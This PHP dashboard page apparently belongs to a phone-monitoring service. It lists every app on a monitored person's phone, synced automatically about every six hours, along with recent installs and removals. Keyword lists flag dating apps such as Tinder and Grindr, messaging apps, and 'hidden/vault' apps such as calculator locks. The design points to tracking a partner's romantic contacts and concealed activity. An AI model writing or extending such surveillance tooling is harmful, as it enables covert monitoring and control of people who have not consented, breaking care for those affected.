<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();

// Dating / chat / hidden-vault apps we specifically want to flag when installed.
function app_flag($name, $pkg) {
    $s = strtolower($name . ' ' . $pkg);
    $dating = ['tinder','bumble','hinge','okcupid','grindr','badoo','happn','aisle','truly','quackquack','woo ','tantan','azar','meetme','plenty of fish','pof','match'];
    foreach ($dating as $k) if (strpos($s, $k) !== false) return ['💔 Dating', '#f43f5e'];
    $chat = ['whatsapp','telegram','snapchat','instagram','signal','wechat','viber','skype','discord','messenger','hike','kik','wickr'];
    foreach ($chat as $k) if (strpos($s, $k) !== false) return ['💬 Chat', '#3b82f6'];
    $vault = ['vault','hide','calculator','gallery lock','applock','app lock','private','secret','locker'];
    foreach ($vault as $k) if (strpos($s, $k) !== false) return ['🔒 Hidden/Vault', '#a855f7'];
    return null;
}

$uid = (int)($_GET['user'] ?? 0);
$q   = trim((string)($_GET['q'] ?? ''));
$users = $pdo->query("SELECT id, username, name FROM users WHERE role='user' ORDER BY name")->fetchAll();

$all = []; $newly = []; $removed = []; $total = 0;
if ($uid) {
    try {
        $where = "user_id = " . $uid . " AND removed_at IS NULL";
        if ($q !== '') { $where .= " AND (app_name LIKE " . $pdo->quote('%'.$q.'%') . " OR package LIKE " . $pdo->quote('%'.$q.'%') . ")"; }
        $all = $pdo->query("SELECT app_name, package, first_seen FROM installed_apps WHERE $where ORDER BY app_name IS NULL, app_name, package")->fetchAll();
        $total = count($all);
        $newly   = $pdo->query("SELECT app_name, package, first_seen FROM installed_apps WHERE user_id=$uid AND removed_at IS NULL AND first_seen >= DATE_SUB(NOW(), INTERVAL 7 DAY) ORDER BY first_seen DESC")->fetchAll();
        $removed = $pdo->query("SELECT app_name, package, removed_at FROM installed_apps WHERE user_id=$uid AND removed_at IS NOT NULL AND removed_at >= DATE_SUB(NOW(), INTERVAL 30 DAY) ORDER BY removed_at DESC")->fetchAll();
    } catch (\Throwable $e) {}
}

$PAGE_TITLE = 'Installed Apps';
$PAGE_SUB   = 'Every installed app + newly installed / removed. 💔 Dating · 💬 Chat · 🔒 Vault flagged';
$PAGE_ICON  = '📲';

$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><select class="sel" name="user" onchange="this.form.submit()"><option value="0">Select a user…</option>';
foreach ($users as $uu) $PAGE_TOOLS .= '<option value="'.(int)$uu['id'].'" '.($uid===(int)$uu['id']?'selected':'').'>'.ss_admin_h($uu['name']).'</option>';
$PAGE_TOOLS .= '</select><input class="sel" type="text" name="q" value="'.ss_admin_h($q).'" placeholder="Search app / package" style="min-width:180px"></form>';

require __DIR__ . '/_dark_head.php';
?>
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">📲</span> Installed Apps</div><div class="v"><?= $total ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🆕</span> New (7 days)</div><div class="v"><?= count($newly) ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🗑️</span> Removed (30 days)</div><div class="v"><?= count($removed) ?></div></div>
</div>

<?php if(!$uid): ?>
  <div class="panel"><div class="empty">Select a user to see their installed apps. (Synced automatically ~every 6 hours.)</div></div>
<?php else: ?>

  <?php if($newly): ?>
  <div class="panel">
    <h3>🆕 Newly Installed — last 7 days</h3>
    <div style="overflow-x:auto"><table>
      <thead><tr><th>App</th><th>Package</th><th>Flag</th><th>Installed</th></tr></thead>
      <tbody>
      <?php foreach($newly as $a): $f = app_flag($a['app_name'] ?? '', $a['package']); ?>
        <tr>
          <td><b><?= ss_admin_h($a['app_name'] ?: '—') ?></b></td>
          <td style="color:var(--mut);font-size:.78rem"><?= ss_admin_h($a['package']) ?></td>
          <td><?php if($f): ?><span class="pill" style="background:<?= $f[1] ?>22;color:<?= $f[1] ?>;font-weight:700"><?= $f[0] ?></span><?php endif; ?></td>
          <td style="color:var(--mut)"><?= date('d M H:i', strtotime($a['first_seen'])) ?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
  </div>
  <?php endif; ?>

  <?php if($removed): ?>
  <div class="panel">
    <h3>🗑️ Recently Removed — last 30 days</h3>
    <div style="overflow-x:auto"><table>
      <thead><tr><th>App</th><th>Package</th><th>Uninstalled</th></tr></thead>
      <tbody>
      <?php foreach($removed as $a): ?>
        <tr>
          <td><?= ss_admin_h($a['app_name'] ?: '—') ?></td>
          <td style="color:var(--mut);font-size:.78rem"><?= ss_admin_h($a['package']) ?></td>
          <td style="color:var(--mut)"><?= date('d M H:i', strtotime($a['removed_at'])) ?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
  </div>
  <?php endif; ?>

  <div class="panel">
    <h3>📲 All Installed Apps (<?= $total ?>)</h3>
    <?php if(!$all): ?>
      <div class="empty">No apps synced yet. The phone uploads its app list automatically (needs the latest app build).</div>
    <?php else: ?>
      <div style="overflow-x:auto;max-height:640px;overflow-y:auto"><table>
        <thead><tr><th>App</th><th>Package</th><th>Flag</th><th>First seen</th></tr></thead>
        <tbody>
        <?php foreach($all as $a): $isNew = strtotime($a['first_seen']) >= strtotime('-7 days'); $f = app_flag($a['app_name'] ?? '', $a['package']); ?>
          <tr>
            <td><?= ss_admin_h($a['app_name'] ?: '—') ?><?php if($isNew): ?> <span class="pill" style="background:rgba(34,197,94,.16);color:#4ade80;font-size:.62rem">NEW</span><?php endif; ?></td>
            <td style="color:var(--mut);font-size:.78rem"><?= ss_admin_h($a['package']) ?></td>
            <td><?php if($f): ?><span class="pill" style="background:<?= $f[1] ?>22;color:<?= $f[1] ?>;font-weight:700;font-size:.66rem"><?= $f[0] ?></span><?php endif; ?></td>
            <td style="color:var(--mut)"><?= date('d M Y', strtotime($a['first_seen'])) ?></td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table></div>
    <?php endif; ?>
  </div>
<?php endif; ?>
<?php require __DIR__ . '/_dark_foot.php';
